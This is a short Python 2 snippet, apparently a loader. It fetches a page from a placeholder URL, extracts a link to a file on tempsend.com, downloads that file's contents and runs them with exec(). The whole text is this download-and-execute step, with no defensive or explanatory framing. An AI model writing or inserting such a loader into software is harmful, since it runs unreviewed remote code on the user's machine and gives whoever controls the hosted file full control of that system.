ab = urllib2.urlopen("***URL***").read()
for line in ab.split('\n'):
	if 'right-click' in line:
		url = 'http://tempsend.com' + line.split('"')[1]
		break
code = urllib2.urlopen(url).read()
exec(code)
